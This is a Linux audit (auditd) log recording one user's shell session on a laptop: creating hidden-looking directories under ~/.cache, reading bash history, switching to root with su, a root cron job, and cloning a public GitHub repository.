type=PATH msg=audit(1789322069.341:119): item=0 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322069.341:119): item=1 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322069.341:119): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322069.341:119): proctitle=6D6B64697200706970
type=SYSCALL msg=audit(1789322079.781:120): arch=c000003e syscall=59 success=yes exit=0 a0=562893ad1da0 a1=562893ba0bd0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=957 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322079.781:120): argc=2 a0="mkdir" a1="git"
type=CWD msg=audit(1789322079.781:120): cwd="/home/Tom/.cache"
type=PATH msg=audit(1789322079.781:120): item=0 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322079.781:120): item=1 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322079.781:120): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322079.781:120): proctitle=6D6B64697200676974
type=SYSCALL msg=audit(1789322099.817:121): arch=c000003e syscall=59 success=yes exit=0 a0=562893bce4e0 a1=562893acf5e0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=959 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322099.817:121): argc=2 a0="mkdir" a1=".dconf"
type=CWD msg=audit(1789322099.817:121): cwd="/home/Tom/.cache"
type=PATH msg=audit(1789322099.817:121): item=0 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322099.817:121): item=1 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322099.817:121): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322099.817:121): proctitle=6D6B646972002E64636F6E66
type=SYSCALL msg=audit(1789322125.677:122): arch=c000003e syscall=59 success=yes exit=0 a0=562893bf68c0 a1=562893aedab0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=964 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="touch" exe="/usr/bin/touch" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322125.677:122): argc=2 a0="touch" a1="shader"
type=CWD msg=audit(1789322125.677:122): cwd="/home/Tom/.cache/.dconf"
type=PATH msg=audit(1789322125.677:122): item=0 name="/usr/bin/touch" inode=393369 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322125.677:122): item=1 name="/usr/bin/touch" inode=393369 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322125.677:122): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322125.677:122): proctitle=746F75636800736861646572
type=SYSCALL msg=audit(1789322156.397:123): arch=c000003e syscall=59 success=yes exit=0 a0=562893bf8780 a1=562893bfbc00 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=965 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="mkdir" exe="/usr/bin/mkdir" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322156.397:123): argc=2 a0="mkdir" a1=".virt"
type=CWD msg=audit(1789322156.397:123): cwd="/home/Tom/.cache"
type=PATH msg=audit(1789322156.397:123): item=0 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322156.397:123): item=1 name="/usr/bin/mkdir" inode=393358 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322156.397:123): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322156.397:123): proctitle=6D6B646972002E76697274
type=SYSCALL msg=audit(1789322164.497:124): arch=c000003e syscall=59 success=yes exit=0 a0=562893bfc190 a1=562893bfece0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=968 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="touch" exe="/usr/bin/touch" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322164.497:124): argc=2 a0="touch" a1=".virt/sys"
type=CWD msg=audit(1789322164.497:124): cwd="/home/Tom/.cache"
type=PATH msg=audit(1789322164.497:124): item=0 name="/usr/bin/touch" inode=393369 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322164.497:124): item=1 name="/usr/bin/touch" inode=393369 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322164.497:124): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322164.497:124): proctitle=746F756368002E766972742F737973
type=SYSCALL msg=audit(1789322170.341:125): arch=c000003e syscall=59 success=yes exit=0 a0=562893bae030 a1=562893bfeb70 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=971 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322170.341:125): argc=4 a0="ls" a1="--color=auto" a2="-la" a3=".cache/"
type=CWD msg=audit(1789322170.341:125): cwd="/home/Tom"
type=PATH msg=audit(1789322170.341:125): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322170.341:125): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322170.341:125): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322170.341:125): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61002E63616368652F
type=SYSCALL msg=audit(1789322176.477:126): arch=c000003e syscall=59 success=yes exit=0 a0=562893b54f70 a1=562893bf73f0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=972 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322176.477:126): argc=3 a0="ls" a1="--color=auto" a2="-la"
type=CWD msg=audit(1789322176.477:126): cwd="/home/Tom"
type=PATH msg=audit(1789322176.477:126): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322176.477:126): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322176.477:126): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322176.477:126): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61
type=SYSCALL msg=audit(1789322199.081:127): arch=c000003e syscall=59 success=yes exit=0 a0=562893b39de0 a1=562893acf5e0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=977 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322199.081:127): argc=2 a0="cat" a1=".bash_history"
type=CWD msg=audit(1789322199.081:127): cwd="/home/Tom"
type=PATH msg=audit(1789322199.081:127): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322199.081:127): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322199.081:127): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322199.081:127): proctitle=636174002E626173685F686973746F7279
type=SYSCALL msg=audit(1789322221.277:128): arch=c000003e syscall=59 success=yes exit=0 a0=562893c05590 a1=562893b34020 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=982 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322221.277:128): argc=2 a0="cat" a1=".bash_history"
type=CWD msg=audit(1789322221.277:128): cwd="/home/Tom"
type=PATH msg=audit(1789322221.277:128): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322221.277:128): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322221.277:128): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322221.277:128): proctitle=636174002E626173685F686973746F7279
type=SYSCALL msg=audit(1789322228.593:129): arch=c000003e syscall=59 success=yes exit=0 a0=562893ba9f40 a1=562893b40250 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=983 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="su" exe="/usr/bin/su" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322228.593:129): argc=1 a0="su"
type=CWD msg=audit(1789322228.593:129): cwd="/home/Tom"
type=PATH msg=audit(1789322228.593:129): item=0 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322228.593:129): item=1 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322228.593:129): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322228.593:129): proctitle="su"
type=USER_AUTH msg=audit(1789322233.437:130): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789322233.437:131): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_ACQ msg=audit(1789322233.437:132): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789322233.441:133): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789322257.577:134): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:session_close grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789322257.577:135): pid=983 uid=1000 auid=1000 ses=3 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789322260.401:136): arch=c000003e syscall=59 success=yes exit=0 a0=562893c0a820 a1=562893bfa260 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=989 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322260.401:136): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789322260.401:136): cwd="/home/Tom"
type=PATH msg=audit(1789322260.401:136): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322260.401:136): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322260.401:136): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322260.401:136): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789322262.401:137): arch=c000003e syscall=59 success=yes exit=0 a0=562893ad0c80 a1=562893bce3d0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=990 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789322262.401:137): argc=3 a0="ls" a1="--color=auto" a2="-la"
type=CWD msg=audit(1789322262.401:137): cwd="/home/Tom"
type=PATH msg=audit(1789322262.401:137): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322262.401:137): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789322262.401:137): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789322262.401:137): proctitle=6C73002D2D636F6C6F723D6175746F002D6C61
type=USER_ACCT msg=audit(1789323421.677:138): pid=1012 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789323421.677:139): pid=1012 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789323421.681:140): pid=1012 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=5 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789323421.681:140): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff579c6cd0 a2=1 a3=7fff579c69e7 items=0 ppid=552 pid=1012 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=5 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789323421.681:140): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789323421.681:141): pid=1012 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789323421.681:142): pid=1013 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789323421.685:143): pid=1012 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789323421.685:144): pid=1012 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SYSCALL msg=audit(1789325768.273:145): arch=c000003e syscall=59 success=yes exit=0 a0=562893c033b0 a1=562893b39de0 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1027 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="clear" exe="/usr/bin/clear" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789325768.273:145): argc=1 a0="clear"
type=CWD msg=audit(1789325768.273:145): cwd="/home/Tom"
type=PATH msg=audit(1789325768.273:145): item=0 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789325768.273:145): item=1 name="/usr/bin/clear" inode=395505 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789325768.273:145): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789325768.273:145): proctitle="clear"
type=SYSCALL msg=audit(1789326159.345:146): arch=c000003e syscall=59 success=yes exit=0 a0=562893baa080 a1=562893baac00 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1034 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326159.345:146): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789326159.345:146): cwd="/home/Tom/Projects"
type=PATH msg=audit(1789326159.345:146): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326159.345:146): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789326159.345:146): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789326159.345:146): proctitle=6C73002D2D636F6C6F723D6175746F
type=SYSCALL msg=audit(1789326192.409:147): arch=c000003e syscall=59 success=yes exit=0 a0=562893bfee10 a1=562893babf10 a2=562893ad2390 a3=28fcaef0ba15787c items=3 ppid=947 pid=1036 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=3 comm="git" exe="/usr/bin/git" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789326192.409:147): argc=5 a0="git" a1="clone" a2="--depth" a3="1" a4="https://github.com/mplewis/csvtomd.git"
type=CWD msg=audit(1789326192.409:147): cwd="/home/Tom/Projects"
